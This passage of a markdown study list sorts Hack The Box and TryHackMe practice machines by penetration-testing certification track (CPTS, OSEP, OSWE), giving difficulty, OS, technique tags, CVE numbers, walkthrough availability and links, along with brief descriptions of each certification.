+| GreenHorn | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/GreenHorn |
+| Headless | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/Headless |
+| Help | HTB | Linux | Easy | Yes | GraphQL, HTB | https://app.hackthebox.com/machines/help |
+| Horizontall | HTB | Linux | Easy | Yes | CVE-2019-18818, CVE-2019-19609, CVE-2021-3129, HTB, Port-Forwarding | https://app.hackthebox.com/machines/horizontall |
+| Mailing | HTB | Windows | Easy | Yes | CPTS, Email, Directory Traversal, LibreOffice, Privilege Escalation | https://app.hackthebox.com/machines/mailing |
+| MetaTwo | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/metatwo |
+| MonitorsTwo | HTB | Linux | Easy | Yes | CPTS, Cacti, Docker Breakout, CVE-2022-46169, OverlayFS | https://app.hackthebox.com/machines/monitorstwo |
+| OpenAdmin | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/openadmin |
+| Perfection | HTB | Linux | Easy | Yes | CPTS, SSTI, Ruby, ERB, Hashcat | https://app.hackthebox.com/machines/perfection |
+| PermX | HTB | Linux | Easy | Yes |  | https://app.hackthebox.com/machines/PermX |
+| Pilgrimage | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/pilgrimage |
+| Previse | HTB | Linux | Easy | Yes | HTB, PATH-hijacking | https://app.hackthebox.com/machines/previse |
+| Sau | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/sau |
+| Sightless | HTB | Linux | Easy | Yes | CPTS, SQLPad, Chrome DevTools, Pivoting, Privilege Escalation | https://app.hackthebox.com/machines/sightless |
+| Stocker | HTB | Linux | Easy | Yes | CPTS, NoSQL Injection, Server-Side XSS, NodeJS, SSRF | https://app.hackthebox.com/machines/stocker |
+| SwagShop | HTB | Linux | Easy | Yes | CVE-2015-1397, Exploit-modification, GTFObins, HTB | https://app.hackthebox.com/machines/swagshop |
+| Tabby | HTB | Linux | Easy | Yes | HTB, LXD-Abuse, ZIP-Cracking | https://app.hackthebox.com/machines/tabby |
+| Usage | HTB | Linux | Easy | Yes | CPTS, Blind SQLi, 7-Zip Symlink, Privilege Escalation | https://app.hackthebox.com/machines/usage |
+| Valentine | HTB | Linux | Easy | Yes | Exploiting-Heartbleed, HTB, Heartbleed | https://app.hackthebox.com/machines/valentine |
+| Arkham | HTB | Windows | Medium | Yes | HTB, Java-Deserialization, UAC-bypass | https://app.hackthebox.com/machines/arkham |
+| Builder | HTB | Linux | Medium | Yes |  | https://app.hackthebox.com/machines/Builder |
+| Celestial | HTB | Linux | Medium | Yes | HTB, NodeJS | https://app.hackthebox.com/machines/celestial |
+| Clicker | HTB | Linux | Medium | Yes | CPTS, NFS, Mass Assignment, SQL Injection, Cron | https://app.hackthebox.com/machines/clicker |
+| Craft | HTB | Linux | Medium | Yes | HTB, Python-eval-injection, Vault-SSH, pymysql-API | https://app.hackthebox.com/machines/craft |
+| Cronos | HTB | Linux | Medium | Yes | Command-Injection, Exploiting-cron-jobs, HTB, SQL-Injection | https://app.hackthebox.com/machines/cronos |
+| Game Zone | THM | Linux | Medium | No | SQLi, SSH-Tunneling, Webmin | https://tryhackme.com/room/gamezone |
+| Haircut | HTB | Linux | Medium | Yes | HTB, HTTP, based-fuzzing | https://app.hackthebox.com/machines/haircut |
+| Hospital | HTB | Windows | Medium | Yes | Roundcube, Webmail, CVE-2023-43770, SeImpersonatePrivilege | https://app.hackthebox.com/machines/Hospital |
+| Json | HTB | Windows | Medium | Yes | HTB, Using-ysoserial.net, dnSpy | https://app.hackthebox.com/machines/json |
+| Magic | HTB | Linux | Medium | Yes | Basic-SQL-Injection, HTB, Path-Hijacking, SUID-Abuse | https://app.hackthebox.com/machines/magic |
+| Mango | HTB | Linux | Medium | Yes | GTFOBins-Abuse, HTB, NoSQL-Injection | https://app.hackthebox.com/machines/mango |
+| Monitored | HTB | Linux | Medium | Yes | Nagios-XI-CVE-2023-40931, Cacti, SQLi, SUID-Abuse | https://app.hackthebox.com/machines/monitored |
+| Poison | HTB | BSD | Medium | Yes | Apache-log-poisoning, HTB, Tunneling-ports-over-SSH | https://app.hackthebox.com/machines/poison |
+| Popcorn | HTB | Linux | Medium | Yes | HTB, Modifying-HTTP-requests | https://app.hackthebox.com/machines/popcorn |
+| Runner | HTB | Linux | Medium | Yes | CPTS, TeamCity, CVE-2024-27198, Portainer, Docker | https://app.hackthebox.com/machines/runner |
+| Sandworm | HTB | Linux | Medium | Yes | CPTS, SSTI, Sandbox Escape, Firejail, Rust | https://app.hackthebox.com/machines/sandworm |
+| Schooled | HTB | BSD | Medium | Yes | CVE-2020-14321, CVE-2020-25627, HTB | https://app.hackthebox.com/machines/schooled |
+| Scrambled | HTB | Windows | Medium | Yes | Active Directory, Deserialization, Deserialization-attacks, Kerberoasting, Kerberos | https://app.hackthebox.com/machines/Scrambled |
+| Surveillance | HTB | Linux | Medium | Yes | CPTS, Craft CMS, ZoneMinder, Pivoting, CVE-2023-41892 | https://app.hackthebox.com/machines/surveillance |
+| The Cod Caper | THM | Linux | Medium | No | OSCP, SQLi, Command Injection, Buffer Overflow, PWN | https://tryhackme.com/room/thecodcaper |
+| Unattended | HTB | Linux | Medium | Yes | Analyzing-kernel-image, HTB, LFI-to-RCE | https://app.hackthebox.com/machines/unattended |
+| Vault | HTB | Linux | Medium | Yes | HTB, SSH-port-forwarding, configuration-files | https://app.hackthebox.com/machines/vault |
+| Visual | HTB | Windows | Medium | Yes | CPTS, Visual Studio, MSBuild, SeImpersonatePrivilege | https://app.hackthebox.com/machines/visual |
+| Zipping | HTB | Linux | Medium | No | Zip-Symlink, LFI, SQLi, Shared-Library-Hijack | https://app.hackthebox.com/machines/zipping |
+| Caption | HTB | Linux | Hard | Yes |  | https://app.hackthebox.com/machines/Caption |
+| Cereal | HTB | Windows | Hard | Yes | HTB | https://app.hackthebox.com/machines/cereal |
+| Daily Bugle | THM | Linux | Hard | No | OSCP, Joomla, SQLi, CVE-2019-8942, Yum Sudoers | https://tryhackme.com/room/dailybugle |
+| Enterprise | THM | Windows | Hard | No | Active Directory, ZeroLogon, SQLi, Privilege Escalation, Kerberos | https://tryhackme.com/room/enterprise |
+| Falafel | HTB | Linux | Hard | Yes | Boolean, HTB, based-SQL-injection | https://app.hackthebox.com/machines/falafel |
+| Feline | HTB | Linux | Hard | Yes | CVE-2020-11651, CVE-2020-11652, CVE-2020-9484, Deserialization, HTB | https://app.hackthebox.com/machines/feline |
+| Holiday | HTB | Linux | Hard | Yes | Bypassing-XSS-filtering, Exploiting-NPM-CLI, HTB | https://app.hackthebox.com/machines/holiday |
+| Intuition | HTB | Linux | Hard | Yes | Flask, SSTI, Suricata-Bypass, OpenSearch-CVE-2023-23613, Ansible | https://app.hackthebox.com/machines/intuition |
+| Monitors | HTB | Linux | Hard | Yes | CVE-2020-9496, Exploit-modification, HTB, Java-Deserialization, Local-File-Inclusion | https://app.hackthebox.com/machines/monitors |
+| Travel | HTB | Linux | Hard | Yes | Editing-LDAP-Attributes, HTB, Memcached, PHP-Deserialization, SSRF | https://app.hackthebox.com/machines/travel |
+| Unobtainium | HTB | Linux | Hard | Yes | HTB, Prototype-pollution | https://app.hackthebox.com/machines/unobtainium |
+| Year of the Dog | THM | Linux | Hard | No | SQLi, Gitea, Command-Injection | https://tryhackme.com/room/yearofthedog |
+| Zipper | HTB | Linux | Hard | Yes | HTB, Zabbix-API | https://app.hackthebox.com/machines/zipper |
+| CrossFit | HTB | Linux | Insane | Yes | Blind-XSS, COR's-(Cross, CVE-2019-10774, HTB | https://app.hackthebox.com/machines/crossfit |
+| Fatty | HTB | Linux | Insane | Yes | Deserialization, HTB, Path-Traversal, SQL-Injection, Thick-Client-Pentesting | https://app.hackthebox.com/machines/fatty |
+| Fingerprint | HTB | Linux | Insane | Yes | Forging-JWT-tokens, HQL-Injection, HTB | https://app.hackthebox.com/machines/fingerprint |
+| Fulcrum | HTB | Linux | Insane | Yes | Advanced-remote, HTB, network-rules | https://app.hackthebox.com/machines/fulcrum |
+| Hackback | HTB | Windows | Insane | Yes | ASPX-tunneling, HTB, Named-pipe-impersonation | https://app.hackthebox.com/machines/hackback |
+| Sink | HTB | Linux | Insane | Yes | HTB, HTTP-Desync | https://app.hackthebox.com/machines/sink |
+| Stacked | HTB | Linux | Insane | Yes | 2021, 32090, CVE-2021-32090, Exploiting-CVE, HTB | https://app.hackthebox.com/machines/stacked |
+
+### CPTS Machine List (https://ctftracker.com/cpts-like-machines/)
+CPTS, the Certified Penetration Testing Specialist from Hack The Box, is a practical certification built around a multi-day exam in which you assess a realistic network and deliver a professional report. It covers enumeration, web attacks, Active Directory, pivoting and reporting. The machines below cover the breadth that the exam expects: web application flaws, service enumeration, Windows and Linux escalation, Active Directory and tunnelling. Because CPTS rewards thorough notes and clean reporting, use each box to practise documenting evidence as you go.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Funnel | HTB | Linux | Very Easy | No | SSH, Port Forwarding, PostgreSQL, Tunneling | https://app.hackthebox.com/starting-point |
+| Unified | HTB | Linux | Very Easy | No | Log4j, CVE-2021-44228, UniFi, MongoDB | https://app.hackthebox.com/starting-point |
+| Kobold | HTB | Linux | Easy | Yes | suid | https://ctftracker.com/machines/htb-kobold/ |
+| Alert | HTB | Linux | Easy | Yes | CPTS, Markdown XSS, LFI, Port Forwarding, Privilege Escalation | https://app.hackthebox.com/machines/alert |
+| Busqueda | HTB | Linux | Easy | Yes | CPTS, RCE, Python, Searchor, Git | https://app.hackthebox.com/machines/busqueda |
+| Chemistry | HTB | Linux | Easy | Yes | CPTS, CIF Parser, Python, Pivoting, Privilege Escalation | https://app.hackthebox.com/machines/chemistry |
+| Crafty | HTB | Windows | Easy | Yes | CPTS, Minecraft, Log4j, JNDI, Privilege Escalation | https://app.hackthebox.com/machines/crafty |
+| EscapeTwo | HTB | Windows | Easy | Yes | ActiveDirectory, MSSQL-Linked-Server, Coerce-Authentication, GPO-Abuse, LAPS | https://app.hackthebox.com/machines/escapetwo |
+| Inject | HTB | Linux | Easy | Yes | CPTS, Spring Cloud, SpEL Injection, Ansible, Automation | https://app.hackthebox.com/machines/inject |
+| Mailing | HTB | Windows | Easy | Yes | CPTS, Email, Directory Traversal, LibreOffice, Privilege Escalation | https://app.hackthebox.com/machines/mailing |
+| MonitorsTwo | HTB | Linux | Easy | Yes | CPTS, Cacti, Docker Breakout, CVE-2022-46169, OverlayFS | https://app.hackthebox.com/machines/monitorstwo |
+| PC | HTB | Linux | Easy | Yes | CPTS, gRPC, SQL Injection, Pivoting, PySqlite | https://app.hackthebox.com/machines/pc |
+| Perfection | HTB | Linux | Easy | Yes | CPTS, SSTI, Ruby, ERB, Hashcat | https://app.hackthebox.com/machines/perfection |
+| Precious | HTB | Linux | Easy | Yes | CPTS, Command Injection, pdfkit, YAML Deserialization, Ruby | https://app.hackthebox.com/machines/precious |
+| Sea | HTB | Linux | Easy | Yes | CPTS, SeaCMS, XSS, Pivoting, Privilege Escalation | https://app.hackthebox.com/machines/sea |
+| Sightless | HTB | Linux | Easy | Yes | CPTS, SQLPad, Chrome DevTools, Pivoting, Privilege Escalation | https://app.hackthebox.com/machines/sightless |
+| Soccer | HTB | Linux | Easy | Yes | CPTS, Blind SQLi, WebSockets, Dstat, Doas | https://app.hackthebox.com/machines/soccer |
+| Stocker | HTB | Linux | Easy | Yes | CPTS, NoSQL Injection, Server-Side XSS, NodeJS, SSRF | https://app.hackthebox.com/machines/stocker |
+| Underpass | HTB | Linux | Easy | Yes | SNMP-Walk, Daloradius, FreeRADIUS, Password-Cracking, Mktemp-Privesc | https://app.hackthebox.com/machines/underpass |
+| Usage | HTB | Linux | Easy | Yes | CPTS, Blind SQLi, 7-Zip Symlink, Privilege Escalation | https://app.hackthebox.com/machines/usage |
+| Administrator | HTB | Windows | Medium | Yes | ActiveDirectory, ADCS, Golden-Cert, Kerberoasting, BloodHound | https://app.hackthebox.com/machines/administrator |
+| Agile | HTB | Linux | Medium | Yes | CPTS, LFI, Werkzeug PIN, Chrome Debugging, Pytest | https://app.hackthebox.com/machines/agile |
+| Bagel | HTB | Linux | Medium | Yes | CPTS, LFI, Spring Boot, .NET Deserialization, Pivoting | https://app.hackthebox.com/machines/bagel |
+| Blurry | HTB | Linux | Medium | Yes | ClearML-CVE-2024-24590, Pickle-Deserialization, PyTorch, Sudo-MLflow | https://app.hackthebox.com/machines/blurry |
+| BroScience | HTB | Linux | Medium | Yes | CPTS, Insecure Deserialization, PRNG, PHP, Certificate Abuse | https://app.hackthebox.com/machines/broscience |
+| Cascade | HTB | Windows | Medium | Yes | AD Recycle Bin, AES-Encryption, Active Directory, Active-Directory, LDAP | https://app.hackthebox.com/machines/Cascade |
+| Clicker | HTB | Linux | Medium | Yes | CPTS, NFS, Mass Assignment, SQL Injection, Cron | https://app.hackthebox.com/machines/clicker |
+| Encoding | HTB | Linux | Medium | Yes | CPTS, LFI, PHP Filters, Git Hooks, Privilege Escalation | https://app.hackthebox.com/machines/encoding |
+| Format | HTB | Linux | Medium | Yes | CPTS, LFI, Nginx Traversal, Redis, Format String | https://app.hackthebox.com/machines/format |
+| Hospital | HTB | Windows | Medium | Yes | Roundcube, Webmail, CVE-2023-43770, SeImpersonatePrivilege | https://app.hackthebox.com/machines/Hospital |
+| Instant | HTB | Linux | Medium | Yes | CPTS, Mobile, Android APK, API, Swagger | https://app.hackthebox.com/machines/instant |
+| Intelligence | HTB | Windows | Medium | Yes | AD CS, ADIDNS-abuse, Active Directory, BloodHound, Certipy | https://app.hackthebox.com/machines/Intelligence |
+| Investigation | HTB | Linux | Medium | Yes | CPTS, ExifTool, Forensics, Binary Analysis, Perl | https://app.hackthebox.com/machines/investigation |
+| Jupiter | HTB | Linux | Medium | Yes | CPTS, Grafana, PostgreSQL, Jupyter, Shadow | https://app.hackthebox.com/machines/jupiter |
+| Manager | HTB | Windows | Medium | Yes | CPTS, Active Directory, MSSQL, AD CS, Certipy | https://app.hackthebox.com/machines/manager |
+| Monitored | HTB | Linux | Medium | Yes | Nagios-XI-CVE-2023-40931, Cacti, SQLi, SUID-Abuse | https://app.hackthebox.com/machines/monitored |
+| Monteverde | HTB | Windows | Medium | Yes | Active Directory, Azure AD Connect, BloodHound, MSOL, Password Spray | https://app.hackthebox.com/machines/Monteverde |
+| Only4You | HTB | Linux | Medium | No | CPTS, Cypher Injection, Neo4j, Pivoting, Pip | https://app.hackthebox.com/machines/only4you |
+| Runner | HTB | Linux | Medium | Yes | CPTS, TeamCity, CVE-2024-27198, Portainer, Docker | https://app.hackthebox.com/machines/runner |
+| Sandworm | HTB | Linux | Medium | Yes | CPTS, SSTI, Sandbox Escape, Firejail, Rust | https://app.hackthebox.com/machines/sandworm |
+| Scrambled | HTB | Windows | Medium | Yes | Active Directory, Deserialization, Deserialization-attacks, Kerberoasting, Kerberos | https://app.hackthebox.com/machines/Scrambled |
+| SneakyMailer | HTB | Linux | Medium | Yes | IMAP, Package Hijack, Phishing, PyPI, PyPI-Package | https://app.hackthebox.com/machines/SneakyMailer |
+| Surveillance | HTB | Linux | Medium | Yes | CPTS, Craft CMS, ZoneMinder, Pivoting, CVE-2023-41892 | https://app.hackthebox.com/machines/surveillance |
+| Time | HTB | Linux | Medium | Yes | CVE-2019-12384, CVE-2019-12814, CVE-2019-14439, CVE-2020-24616, Jackson Deserialization | https://app.hackthebox.com/machines/Time |
+| Visual | HTB | Windows | Medium | Yes | CPTS, Visual Studio, MSBuild, SeImpersonatePrivilege | https://app.hackthebox.com/machines/visual |
+| Zipping | HTB | Linux | Medium | No | Zip-Symlink, LFI, SQLi, Shared-Library-Hijack | https://app.hackthebox.com/machines/zipping |
+| Borderlands | THM | Linux | Hard | No | Pivoting, API, Docker | https://tryhackme.com/room/borderlands |
+| Flight | HTB | Windows | Hard | No | CPTS, Active Directory, Pivoting, Responder, AD CS | https://app.hackthebox.com/machines/flight |
+| ForwardSlash | HTB | Linux | Hard | Yes | Bash-Scripting, Blind-XXE, HTB, Pivoting | https://app.hackthebox.com/machines/forwardslash |
+| Intuition | HTB | Linux | Hard | Yes | Flask, SSTI, Suricata-Bypass, OpenSearch-CVE-2023-23613, Ansible | https://app.hackthebox.com/machines/intuition |
+| Wreath | THM | Windows | Hard | No | Active Directory, Pivoting, Chisel, Empire, C2 | https://tryhackme.com/room/wreath |
+
+### Unofficial IppSec CPTS Machine List (https://ctftracker.com/ippsec-cpts-machines/)
+The Unofficial IppSec CPTS Preparation Track is the community-famous list of Hack The Box machines that align with the Certified Penetration Testing Specialist syllabus and have a full IppSec video walkthrough. It bridges the gap between guided academy modules and unguided black-box network assessments. Working through these boxes lets you attempt each target blind and then compare your enumeration, foothold and privilege escalation workflow directly against IppSec's methodology. Use the video walkthroughs after solving—or when genuinely stuck—to learn faster command-line habits and deeper post-exploitation checks.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Kobold | HTB | Linux | Easy | Yes | suid | https://ctftracker.com/machines/htb-kobold/ |
+| Alert | HTB | Linux | Easy | Yes | CPTS, Markdown XSS, LFI, Port Forwarding, Privilege Escalation | https://app.hackthebox.com/machines/alert |
+| Busqueda | HTB | Linux | Easy | Yes | CPTS, RCE, Python, Searchor, Git | https://app.hackthebox.com/machines/busqueda |
+| Chemistry | HTB | Linux | Easy | Yes | CPTS, CIF Parser, Python, Pivoting, Privilege Escalation | https://app.hackthebox.com/machines/chemistry |
+| Crafty | HTB | Windows | Easy | Yes | CPTS, Minecraft, Log4j, JNDI, Privilege Escalation | https://app.hackthebox.com/machines/crafty |
+| EscapeTwo | HTB | Windows | Easy | Yes | ActiveDirectory, MSSQL-Linked-Server, Coerce-Authentication, GPO-Abuse, LAPS | https://app.hackthebox.com/machines/escapetwo |
+| Inject | HTB | Linux | Easy | Yes | CPTS, Spring Cloud, SpEL Injection, Ansible, Automation | https://app.hackthebox.com/machines/inject |
+| Mailing | HTB | Windows | Easy | Yes | CPTS, Email, Directory Traversal, LibreOffice, Privilege Escalation | https://app.hackthebox.com/machines/mailing |
+| MonitorsTwo | HTB | Linux | Easy | Yes | CPTS, Cacti, Docker Breakout, CVE-2022-46169, OverlayFS | https://app.hackthebox.com/machines/monitorstwo |
+| PC | HTB | Linux | Easy | Yes | CPTS, gRPC, SQL Injection, Pivoting, PySqlite | https://app.hackthebox.com/machines/pc |
+| Perfection | HTB | Linux | Easy | Yes | CPTS, SSTI, Ruby, ERB, Hashcat | https://app.hackthebox.com/machines/perfection |
+| Precious | HTB | Linux | Easy | Yes | CPTS, Command Injection, pdfkit, YAML Deserialization, Ruby | https://app.hackthebox.com/machines/precious |
+| Sea | HTB | Linux | Easy | Yes | CPTS, SeaCMS, XSS, Pivoting, Privilege Escalation | https://app.hackthebox.com/machines/sea |
+| Sightless | HTB | Linux | Easy | Yes | CPTS, SQLPad, Chrome DevTools, Pivoting, Privilege Escalation | https://app.hackthebox.com/machines/sightless |
+| Soccer | HTB | Linux | Easy | Yes | CPTS, Blind SQLi, WebSockets, Dstat, Doas | https://app.hackthebox.com/machines/soccer |
+| Stocker | HTB | Linux | Easy | Yes | CPTS, NoSQL Injection, Server-Side XSS, NodeJS, SSRF | https://app.hackthebox.com/machines/stocker |
+| Underpass | HTB | Linux | Easy | Yes | SNMP-Walk, Daloradius, FreeRADIUS, Password-Cracking, Mktemp-Privesc | https://app.hackthebox.com/machines/underpass |
+| Usage | HTB | Linux | Easy | Yes | CPTS, Blind SQLi, 7-Zip Symlink, Privilege Escalation | https://app.hackthebox.com/machines/usage |
+| Administrator | HTB | Windows | Medium | Yes | ActiveDirectory, ADCS, Golden-Cert, Kerberoasting, BloodHound | https://app.hackthebox.com/machines/administrator |
+| Agile | HTB | Linux | Medium | Yes | CPTS, LFI, Werkzeug PIN, Chrome Debugging, Pytest | https://app.hackthebox.com/machines/agile |
+| Bagel | HTB | Linux | Medium | Yes | CPTS, LFI, Spring Boot, .NET Deserialization, Pivoting | https://app.hackthebox.com/machines/bagel |
+| Blurry | HTB | Linux | Medium | Yes | ClearML-CVE-2024-24590, Pickle-Deserialization, PyTorch, Sudo-MLflow | https://app.hackthebox.com/machines/blurry |
+| BroScience | HTB | Linux | Medium | Yes | CPTS, Insecure Deserialization, PRNG, PHP, Certificate Abuse | https://app.hackthebox.com/machines/broscience |
+| Cascade | HTB | Windows | Medium | Yes | AD Recycle Bin, AES-Encryption, Active Directory, Active-Directory, LDAP | https://app.hackthebox.com/machines/Cascade |
+| Clicker | HTB | Linux | Medium | Yes | CPTS, NFS, Mass Assignment, SQL Injection, Cron | https://app.hackthebox.com/machines/clicker |
+| Encoding | HTB | Linux | Medium | Yes | CPTS, LFI, PHP Filters, Git Hooks, Privilege Escalation | https://app.hackthebox.com/machines/encoding |
+| Format | HTB | Linux | Medium | Yes | CPTS, LFI, Nginx Traversal, Redis, Format String | https://app.hackthebox.com/machines/format |
+| Hospital | HTB | Windows | Medium | Yes | Roundcube, Webmail, CVE-2023-43770, SeImpersonatePrivilege | https://app.hackthebox.com/machines/Hospital |
+| Instant | HTB | Linux | Medium | Yes | CPTS, Mobile, Android APK, API, Swagger | https://app.hackthebox.com/machines/instant |
+| Intelligence | HTB | Windows | Medium | Yes | AD CS, ADIDNS-abuse, Active Directory, BloodHound, Certipy | https://app.hackthebox.com/machines/Intelligence |
+| Investigation | HTB | Linux | Medium | Yes | CPTS, ExifTool, Forensics, Binary Analysis, Perl | https://app.hackthebox.com/machines/investigation |
+| Jupiter | HTB | Linux | Medium | Yes | CPTS, Grafana, PostgreSQL, Jupyter, Shadow | https://app.hackthebox.com/machines/jupiter |
+| Manager | HTB | Windows | Medium | Yes | CPTS, Active Directory, MSSQL, AD CS, Certipy | https://app.hackthebox.com/machines/manager |
+| Monitored | HTB | Linux | Medium | Yes | Nagios-XI-CVE-2023-40931, Cacti, SQLi, SUID-Abuse | https://app.hackthebox.com/machines/monitored |
+| Monteverde | HTB | Windows | Medium | Yes | Active Directory, Azure AD Connect, BloodHound, MSOL, Password Spray | https://app.hackthebox.com/machines/Monteverde |
+| Runner | HTB | Linux | Medium | Yes | CPTS, TeamCity, CVE-2024-27198, Portainer, Docker | https://app.hackthebox.com/machines/runner |
+| Sandworm | HTB | Linux | Medium | Yes | CPTS, SSTI, Sandbox Escape, Firejail, Rust | https://app.hackthebox.com/machines/sandworm |
+| Scrambled | HTB | Windows | Medium | Yes | Active Directory, Deserialization, Deserialization-attacks, Kerberoasting, Kerberos | https://app.hackthebox.com/machines/Scrambled |
+| SneakyMailer | HTB | Linux | Medium | Yes | IMAP, Package Hijack, Phishing, PyPI, PyPI-Package | https://app.hackthebox.com/machines/SneakyMailer |
+| Surveillance | HTB | Linux | Medium | Yes | CPTS, Craft CMS, ZoneMinder, Pivoting, CVE-2023-41892 | https://app.hackthebox.com/machines/surveillance |
+| Time | HTB | Linux | Medium | Yes | CVE-2019-12384, CVE-2019-12814, CVE-2019-14439, CVE-2020-24616, Jackson Deserialization | https://app.hackthebox.com/machines/Time |
+| Visual | HTB | Windows | Medium | Yes | CPTS, Visual Studio, MSBuild, SeImpersonatePrivilege | https://app.hackthebox.com/machines/visual |
+| ForwardSlash | HTB | Linux | Hard | Yes | Bash-Scripting, Blind-XXE, HTB, Pivoting | https://app.hackthebox.com/machines/forwardslash |
+| Intuition | HTB | Linux | Hard | Yes | Flask, SSTI, Suricata-Bypass, OpenSearch-CVE-2023-23613, Ansible | https://app.hackthebox.com/machines/intuition |
+
+### OSEP Machine List (https://ctftracker.com/osep-like-machines/)
+OSEP, the Offensive Security Experienced Penetration Tester (PEN-300), is OffSec's advanced certification focused on bypassing network defences, antivirus and endpoint detection while compromising multi-layered enterprise environments and Active Directory trusts. These harder Hack The Box machines train the multi-step chains that OSEP demands: custom payload delivery, Linux and Windows lateral movement, MSSQL and Active Directory delegation abuse, and pivoting across segmented networks where standard public exploits fail out of the box.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| EscapeTwo | HTB | Windows | Easy | Yes | ActiveDirectory, MSSQL-Linked-Server, Coerce-Authentication, GPO-Abuse, LAPS | https://app.hackthebox.com/machines/escapetwo |
+| Forest | HTB | Windows | Easy | Yes | AS-REP Roasting, ASREPRoasting, Active Directory, BloodHound, DCSync | https://app.hackthebox.com/machines/Forest |
+| OpenAdmin | HTB | Linux | Easy | Yes | HTB | https://app.hackthebox.com/machines/openadmin |
+| Support | HTB | Windows | Easy | Yes | HTB | https://app.hackthebox.com/machines/support |
+| Timelapse | HTB | Windows | Easy | Yes | HTB, Public-SMB-Share | https://app.hackthebox.com/machines/timelapse |
+| Escape | HTB | Windows | Medium | Yes | HTB | https://app.hackthebox.com/machines/escape |
+| Forge | HTB | Linux | Medium | Yes | HTB, Python-debugging | https://app.hackthebox.com/machines/forge |
+| Magic | HTB | Linux | Medium | Yes | Basic-SQL-Injection, HTB, Path-Hijacking, SUID-Abuse | https://app.hackthebox.com/machines/magic |
+| Monteverde | HTB | Windows | Medium | Yes | Active Directory, Azure AD Connect, BloodHound, MSOL, Password Spray | https://app.hackthebox.com/machines/Monteverde |
+| Outdated | HTB | Windows | Medium | Yes | CVE-2022-30190, Golden-Ticket-Attack, HTB | https://app.hackthebox.com/machines/outdated |
+| Querier | HTB | Windows | Medium | Yes | Excel-macros, HTB, PowerView | https://app.hackthebox.com/machines/querier |
+| Scrambled | HTB | Windows | Medium | Yes | Active Directory, Deserialization, Deserialization-attacks, Kerberoasting, Kerberos | https://app.hackthebox.com/machines/Scrambled |
+| Seal | HTB | Linux | Medium | Yes | Gitbucket, HTB | https://app.hackthebox.com/machines/seal |
+| StreamIO | HTB | Windows | Medium | Yes | Automatic-LDAP, HTB, LFI-using-PHP-wrappers, Source-Code-Review | https://app.hackthebox.com/machines/streamio |
+| Control | HTB | Windows | Hard | Yes | Basic-SQL-Injection, CVE-2019-11043, File-System, HTB, Hash-Cracking | https://app.hackthebox.com/machines/control |
+| Flight | HTB | Windows | Hard | No | CPTS, Active Directory, Pivoting, Responder, AD CS | https://app.hackthebox.com/machines/flight |
+| Haze | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Haze |
+| Scepter | HTB | Windows | Hard | Yes |  | https://app.hackthebox.com/machines/Scepter |
+| Search | HTB | Windows | Hard | Yes | GMSA-password-retrieval, HTB | https://app.hackthebox.com/machines/search |
+| Absolute | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/absolute |
+| Anubis | HTB | Windows | Insane | Yes | ASP-code-injection, HTB | https://app.hackthebox.com/machines/anubis |
+| APT | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/apt |
+| Hathor | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/hathor |
+| Multimaster | HTB | Windows | Insane | Yes | CVE-2020-1472, HTB, Password-Cracking, SQL-Injection, VS-Code | https://app.hackthebox.com/machines/multimaster |
+| PivotAPI | HTB | Windows | Insane | Yes | HTB, Metadata | https://app.hackthebox.com/machines/pivotapi |
+| Sekhmet | HTB | Windows | Insane | Yes | HTB | https://app.hackthebox.com/machines/sekhmet |
+| Sizzle | HTB | Windows | Insane | Yes | DCSync, HTB, Kerberoasting, Passwordless-login, Stealing-hashes | https://app.hackthebox.com/machines/sizzle |
+
+### OSWE Machine List (https://ctftracker.com/oswe-like-machines/)
+OSWE, the Offensive Security Web Expert (WEB-300), is a white-box and grey-box web application security certification. The 48-hour practical exam requires reading source code to chain authentication bypasses, SQL injection, deserialization and server-side flaws into remote code execution. The web-heavy Hack The Box targets listed here focus on multi-step application logic flaws, source code recovery, SSTI, deserialization, SSRF and polyglot file uploads. Practise scripting your exploit chain from unauthenticated request to shell so you are ready for OSWE exam requirements.
+
+| Machine | Platform | OS | Difficulty | IppSec Walkthrough | Tags | URL |
+|---|---|---|---|---|---|---|
+| Blocky | HTB | Linux | Easy | Yes | Basic-local-Linux, CVE-2017-6074, Decompiling-JAR-files, HTB | https://ctftracker.com/machines/htb-blocky/ |
+| Help | HTB | Linux | Easy | Yes | GraphQL, HTB | https://app.hackthebox.com/machines/help |
+| Arkham | HTB | Windows | Medium | Yes | HTB, Java-Deserialization, UAC-bypass | https://app.hackthebox.com/machines/arkham |
+| Celestial | HTB | Linux | Medium | Yes | HTB, NodeJS | https://app.hackthebox.com/machines/celestial |
+| Json | HTB | Windows | Medium | Yes | HTB, Using-ysoserial.net, dnSpy | https://app.hackthebox.com/machines/json |
+| Magic | HTB | Linux | Medium | Yes | Basic-SQL-Injection, HTB, Path-Hijacking, SUID-Abuse | https://app.hackthebox.com/machines/magic |
+| Mango | HTB | Linux | Medium | Yes | GTFOBins-Abuse, HTB, NoSQL-Injection | https://app.hackthebox.com/machines/mango |
+| Popcorn | HTB | Linux | Medium | Yes | HTB, Modifying-HTTP-requests | https://app.hackthebox.com/machines/popcorn |
+| Schooled | HTB | BSD | Medium | Yes | CVE-2020-14321, CVE-2020-25627, HTB | https://app.hackthebox.com/machines/schooled |
+| Unattended | HTB | Linux | Medium | Yes | Analyzing-kernel-image, HTB, LFI-to-RCE | https://app.hackthebox.com/machines/unattended |
+| Vault | HTB | Linux | Medium | Yes | HTB, SSH-port-forwarding, configuration-files | https://app.hackthebox.com/machines/vault |
+| Cereal | HTB | Windows | Hard | Yes | HTB | https://app.hackthebox.com/machines/cereal |
+| Falafel | HTB | Linux | Hard | Yes | Boolean, HTB, based-SQL-injection | https://app.hackthebox.com/machines/falafel |
